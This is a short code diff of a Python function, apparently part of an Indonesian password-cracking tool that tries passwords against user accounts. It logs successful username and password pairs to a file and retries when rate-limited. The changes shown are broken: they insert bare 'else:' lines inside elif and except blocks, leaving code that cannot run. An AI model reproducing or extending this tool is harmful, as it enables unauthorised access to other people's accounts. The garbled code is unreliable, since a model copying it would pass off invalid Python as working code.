@@ -540,9 +540,9 @@ def crack2(user, pwx):
 						with open("okeh.txt", "a")as simpan:
 							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
 						ok.append(user)
-					break
+					#break
 				elif "Please wait" in str(data):
-					print ("\r%s[!] Mode pesawat 2 detik"%(M)),
+					else:
 					looping+=1
 					sys.stdout.flush()
 					pwx = [pw]
@@ -552,7 +552,7 @@ def crack2(user, pwx):
 					looping =1
 					pass
 		except requests.exceptions.ConnectionError:
-			print ("\r%s[!] Tidak ada koneksi"%(M)),
+			else:
 			sys.stdout.flush()
 			looping+=1
 			pwx = [pw]
